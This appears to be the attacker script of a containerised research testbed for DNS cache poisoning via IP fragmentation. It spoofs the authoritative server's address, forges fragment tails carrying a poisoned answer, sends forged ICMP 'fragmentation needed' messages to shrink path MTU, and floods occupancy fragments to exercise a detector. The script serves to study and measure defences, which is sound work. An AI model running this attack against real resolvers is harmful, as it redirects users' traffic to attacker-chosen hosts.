#!/usr/bin/env python3
"""The single external attacker process used by E5."""

from __future__ import annotations

import json
import hashlib
import os
import socket
import subprocess
import threading
import time
from pathlib import Path
from typing import Any

from scapy.all import IP, UDP, send, sniff  # type: ignore

from wire import build_icmp_needfrag, build_poison_answer, fit_body, fragment_udp_payload


ATTACKER_IP = os.environ.get("ATTACKER_IP", "10.82.0.200")
AUTH_IP = os.environ.get("AUTH_IP", "10.82.0.100")
RESOLVER_IP = os.environ.get("RESOLVER_IP", "10.81.0.53")
NOTIFY_PORT = int(os.environ.get("NOTIFY_PORT", "9999"))
POISON_IP = os.environ.get("POISON_IP", "6.6.6.6")
FRAGSIZE = int(os.environ.get("FRAGSIZE", "40"))
SCHEDULE_PATH = Path(os.environ.get("SCHEDULE_FILE", "/app/schedule.json"))
LOG_DIR = Path(os.environ.get("LOG_DIR", "/app/log"))
CONTROL_DIR = Path(os.environ.get("CONTROL_DIR", "/app/control"))
REPLAY_START_PATH = CONTROL_DIR / "replay_start.json"
REPLAY_STARTED_PATH = CONTROL_DIR / "replay_started.json"
RUN_ID = os.environ.get("RUN_ID", "unregistered")
REP = int(os.environ.get("REP", "0"))
POLICY = os.environ.get("POLICY_MODE", "unregistered")
WORKLOAD = os.environ.get("WORKLOAD", "unregistered")
FRAGMENT_MODE = os.environ.get("AUTH_FRAGMENT_MODE", "crafted").strip().lower()
ICMP_PTB_MTU = int(os.environ.get("ICMP_PTB_MTU", "576"))
ICMP_PTB_SRC = os.environ.get("ICMP_PTB_SRC", "10.82.0.1")


class RawIPSender:
    """Keep one IP_HDRINCL socket for the finite replay stream.

    Scapy's top-level ``send`` helper creates and closes an L3 socket for
    each call.  That overhead is material at the registered 200-packet/s
    flood rate and made the replay deliver only about 25 packets/s in the
    routed Docker testbed.  A persistent raw socket preserves the exact
    serialized IPv4 fragments while allowing the schedule to be replayed at
    its registered arrival times.
    """

    def __init__(self) -> None:
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    def send(self, packet: Any) -> None:
        self.socket.sendto(bytes(packet), (str(packet.dst), 0))

    def close(self) -> None:
        self.socket.close()


def local_iface(address: str) -> str:
    output = subprocess.run(["ip", "-o", "-4", "addr", "show"], check=True, capture_output=True, text=True).stdout
    for line in output.splitlines():
        fields = line.split()
        if len(fields) >= 4 and fields[3].split("/")[0] == address:
            return fields[1]
    raise RuntimeError(f"could not find interface for {address}")


class EventLog:
    def __init__(self) -> None:
        LOG_DIR.mkdir(parents=True, exist_ok=True)
        self.path = LOG_DIR / "attacker_events.jsonl"
        self.lock = threading.Lock()
        self.path.write_text("", encoding="utf-8")

    def write(self, event: str, **fields: Any) -> None:
        qname = fields.get("qname")
        trial_id = None
        if isinstance(qname, str):
            trial_id = qname.rstrip(".").split(".", 1)[0]
        row = {
            "schema_version": 1,
            "event": event,
            "run_id": RUN_ID,
            "rep": REP,
            "policy": POLICY,
            "workload": WORKLOAD,
            "mono_ns": time.monotonic_ns(),
            "wall_ns": time.time_ns(),
            "trial_id": trial_id,
            **fields,
        }
        with self.lock, self.path.open("a", encoding="utf-8") as handle:
            handle.write(json.dumps(row, sort_keys=True, allow_nan=False) + "\n")


def load_schedule() -> dict[str, Any]:
    return json.loads(SCHEDULE_PATH.read_text(encoding="utf-8"))


def occupancy_payload(seq: int) -> bytes:
    # Destination port 9 is intentionally non-DNS.  It still creates a
    # genuine IPv4 non-initial fragment at the routed IPS for B5 occupancy.
    # Put the sequence number at the end so FRAGSIZE=40 tails differ;
    # otherwise identical padding is collapsed by the AF_PACKET veth
    # duplicate window and a fixed-IPID 12/s stream never reaches n=8.
    return b"E5V2-OCCUPANCY-" + (b"O" * 36) + f"{seq:08d}".encode("ascii") + b"-"


def send_occupancy(seq: int, ipid: int, sender: RawIPSender) -> int:
    """Send one genuine two-fragment occupancy datagram at the scheduled rate.

    The occupancy stream exercises the routed detector's
    pre-defragmentation observation path.  The persistent raw socket keeps
    the registered 200-packet/s replay rate attainable without changing the
    packet pair represented in the schedule.
    """

    packets = fragment_udp_payload(
        src=ATTACKER_IP,
        dst=RESOLVER_IP,
        ipid=ipid,
        dst_port=9,
        body=occupancy_payload(seq),
        fragsize=FRAGSIZE,
        src_port=9,
    )
    for packet in packets:
        sender.send(packet)
    return len(packets)


class ExternalAttacker:
    def __init__(self) -> None:
        self.schedule = load_schedule()
        self.log = EventLog()
        self.stop_event = threading.Event()
        self.notify_sock: socket.socket | None = None
        self.observe_lock = threading.Lock()
        self.auth_first: dict[int, dict[str, Any]] = {}
        self.auth_quoted: dict[int, bytes] = {}
        self.icmp_sender = RawIPSender() if FRAGMENT_MODE == "pmtud" else None

    def capture_auth_packet(self, packet) -> None:  # noqa: ANN001
        if IP not in packet:
            return
        ip = packet[IP]
        if str(ip.src) != AUTH_IP or str(ip.dst) != RESOLVER_IP:
            return
        offset = int(ip.frag) * 8
        dport = None
        if offset == 0 and UDP in packet:
            dport = int(packet[UDP].dport)
            with self.observe_lock:
                self.auth_quoted[dport] = bytes(ip)[:28]
                self.auth_first[dport] = {
                    "ipid": int(ip.id),
                    "offset": offset,
                    "more_fragments": bool(int(ip.flags) & 0x1),
                    "mono_ns": time.monotonic_ns(),
                }
        elif offset == 0:
            return
        else:
            with self.observe_lock:
                for port, row in list(self.auth_first.items()):
                    if int(row["ipid"]) == int(ip.id):
                        dport = port
                        break
            if dport is None:
                return
            with self.observe_lock:
                self.auth_first.setdefault(dport, {})["ipid"] = int(ip.id)

    def sniff_loop(self) -> None:
        try:
            iface = local_iface(ATTACKER_IP)
            self.log.write("pmtud_sniffer_ready", iface=iface)
            sniff(iface=iface, store=False, prn=self.capture_auth_packet, filter=f"ip and src host {AUTH_IP}")
        except Exception as exc:  # pragma: no cover - Docker path
            self.log.write("pmtud_sniffer_error", error=repr(exc))

    def observed_ipid(self, dport: int, *, fallback: int, timeout_s: float = 0.4) -> int:
        if FRAGMENT_MODE != "pmtud":
            return fallback
        deadline = time.monotonic() + timeout_s
        while time.monotonic() < deadline:
            with self.observe_lock:
                row = self.auth_first.get(dport)
                if row and row.get("ipid"):
                    return int(row["ipid"])
            if self.stop_event.wait(0.01):
                break
        self.log.write("pmtud_ipid_unobserved", dport=dport, fallback_ipid=fallback)
        return fallback

    def handle_pmtud_probe(self, info: dict[str, Any], source: tuple[str, int]) -> None:
        dport = int(info["dport"])
        quoted = b""
        deadline = time.monotonic() + 0.4
        while time.monotonic() < deadline:
            with self.observe_lock:
                quoted = self.auth_quoted.get(dport, b"")
            if quoted:
                break
            time.sleep(0.01)
        if not quoted:
            quoted = bytes(
                IP(src=AUTH_IP, dst=RESOLVER_IP, proto=17, ttl=64)
                / UDP(sport=53, dport=dport, len=8 + int(info.get("dns_len") or 0), chksum=0)
            )[:28]
            self.log.write("pmtud_quote_synthesized", dport=dport)
        if self.icmp_sender is None:
            raise RuntimeError("ICMP sender is not available")
        packet = build_icmp_needfrag(src=ICMP_PTB_SRC, dst=AUTH_IP, quoted=quoted, mtu=ICMP_PTB_MTU)
        self.icmp_sender.send(packet)
        self.log.write(
            "icmp_needfrag_send",
            qname=info.get("qname"),
            source_ip=source[0],
            dport=dport,
            mtu=ICMP_PTB_MTU,
            icmp_src=ICMP_PTB_SRC,
            quoted_len=len(quoted),
        )

    def notify_loop(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", NOTIFY_PORT))
        sock.settimeout(0.5)
        self.notify_sock = sock
        self.log.write("attacker_ready", notify_port=NOTIFY_PORT, schedule_trials=len(self.schedule.get("trials", [])))
        while not self.stop_event.is_set():
            try:
                payload, source = sock.recvfrom(8192)
            except socket.timeout:
                continue
            try:
                info = json.loads(payload.decode("utf-8"))
                qname = str(info["qname"])
                phase = str(info.get("phase") or "forged_tail")
                if phase == "pmtud_probe":
                    self.handle_pmtud_probe(info, source)
                    continue
                body = fit_body(
                    build_poison_answer(int(info["dns_id"]), qname, POISON_IP),
                    int(info.get("dns_len") or 0),
                )
                ipid = self.observed_ipid(int(info["dport"]), fallback=int(info.get("ipid") or 0))
                packets = fragment_udp_payload(
                    src=AUTH_IP,
                    dst=RESOLVER_IP,
                    ipid=ipid,
                    dst_port=int(info["dport"]),
                    body=body,
                    fragsize=FRAGSIZE,
                )
                tails = packets[1:]
                if not tails:
                    raise RuntimeError("forged response did not have a non-initial tail")
                send(tails, verbose=0)
                self.log.write(
                    "forged_tail_send",
                    qname=qname,
                    source_ip=source[0],
                    ipid=ipid,
                    dport=int(info["dport"]),
                    dns_id=int(info["dns_id"]),
                    dns_len=len(body),
                    fragment_count=len(tails),
                    observed_ipid=FRAGMENT_MODE == "pmtud",
                    packet_sha256=[hashlib.sha256(bytes(fragment)).hexdigest() for fragment in tails],
                    dns_body_sha256=hashlib.sha256(body).hexdigest(),
                )
            except Exception as exc:
                self.log.write("forged_tail_error", error=repr(exc))
        sock.close()

    def occupancy_loop(self) -> None:
        rows = self.schedule.get("occupancy", [])
        warmup_s = float(self.schedule.get("warmup_s", 0.0))
        self.log.write("replay_scheduled", warmup_s=warmup_s, target_duration_s=float(self.schedule.get("duration_s", 0.0)))
        release: dict[str, Any] | None = None
        if "replay_start_mode" in self.schedule:
            # The factorial protocol releases the occupancy stream only after
            # the client has completed every cache-before probe.  The marker
            # is bind-mounted into both containers by the runner.
            deadline = time.monotonic() + max(60.0, warmup_s + 30.0)
            while not REPLAY_START_PATH.exists():
                if self.stop_event.wait(0.05):
                    return
                if time.monotonic() >= deadline:
                    self.log.write("replay_start_timeout", timeout_s=max(60.0, warmup_s + 30.0))
                    return
            try:
                release = json.loads(REPLAY_START_PATH.read_text(encoding="utf-8"))
            except (OSError, json.JSONDecodeError) as exc:
                self.log.write("replay_start_error", error=repr(exc))
                return
            if (
                release.get("run_id") != RUN_ID
                or int(release.get("rep", -1)) != REP
                or release.get("policy") != POLICY
                or release.get("workload") != WORKLOAD
            ):
                self.log.write("replay_start_error", error="control marker identity mismatch")
                return
            self.log.write(
                "replay_start_received",
                cache_before_completed_mono_ns=release.get("cache_before_completed_mono_ns"),
                qname_count=release.get("qname_count"),
            )
            start = time.monotonic()
        else:
            start = time.monotonic() + warmup_s
            while True:
                remaining = start - time.monotonic()
                if remaining <= 0:
                    break
                if self.stop_event.wait(min(remaining, 0.05)):
                    return
        replay_started_ns = time.monotonic_ns()
        self.log.write(
            "replay_started",
            replay_started_mono_ns=replay_started_ns,
            cache_before_completed_mono_ns=(release or {}).get("cache_before_completed_mono_ns"),
            target_duration_s=float(self.schedule.get("duration_s", 0.0)),
            target_rate_pps=float(self.schedule.get("rate_pps", 0.0)),
            scheduled_occupancy=len(rows),
        )
        if "replay_start_mode" in self.schedule:
            started_marker = {
                "schema_version": 1,
                "run_id": RUN_ID,
                "rep": REP,
                "policy": POLICY,
                "workload": WORKLOAD,
                "replay_started_mono_ns": replay_started_ns,
                "cache_before_completed_mono_ns": (release or {}).get("cache_before_completed_mono_ns"),
            }
            temporary = REPLAY_STARTED_PATH.with_suffix(".tmp")
            try:
                CONTROL_DIR.mkdir(parents=True, exist_ok=True)
                temporary.write_text(json.dumps(started_marker, sort_keys=True) + "\n", encoding="utf-8")
                os.replace(temporary, REPLAY_STARTED_PATH)
            except OSError as exc:
                self.log.write("replay_start_marker_error", error=repr(exc))
                return
        sender = RawIPSender()
        sent = 0
        sent_fragments = 0
        try:
            for row in rows:
                target = start + float(row["at_s"])
                while True:
                    remaining = target - time.monotonic()
                    if remaining <= 0:
                        break
                    if self.stop_event.wait(min(remaining, 0.05)):
                        return
                try:
                    count = send_occupancy(int(row["seq"]), int(row["ipid"]), sender)
                    sent += 1
                    sent_fragments += count
                    self.log.write(
                        "occupancy_send",
                        seq=int(row["seq"]),
                        ipid=int(row["ipid"]),
                        fragment_count=count,
                        at_s=float(row["at_s"]),
                    )
                except Exception as exc:
                    self.log.write("occupancy_error", seq=int(row["seq"]), error=repr(exc))
        finally:
            sender.close()
            self.log.write(
                "replay_finished",
                replay_finished_mono_ns=time.monotonic_ns(),
                scheduled_occupancy=len(rows),
                observed_occupancy=sent,
                observed_fragments=sent_fragments,
                target_duration_s=float(self.schedule.get("duration_s", 0.0)),
                target_rate_pps=float(self.schedule.get("rate_pps", 0.0)),
            )

    def run(self) -> None:
        if FRAGMENT_MODE == "pmtud":
            threading.Thread(target=self.sniff_loop, daemon=True).start()
        notify = threading.Thread(target=self.notify_loop, daemon=True)
        notify.start()
        # Give the listener a chance to bind before an authoritative UDP
        # response can arrive.
        deadline = time.monotonic() + 5.0
        while self.notify_sock is None and time.monotonic() < deadline:
            time.sleep(0.01)
        self.occupancy_loop()
        # Keep the one external attacker alive after the finite occupancy
        # replay; late authoritative notifications must still be handled.
        try:
            while not self.stop_event.wait(1.0):
                pass
        except KeyboardInterrupt:
            self.stop_event.set()
        notify.join(timeout=2.0)


if __name__ == "__main__":
    ExternalAttacker().run()
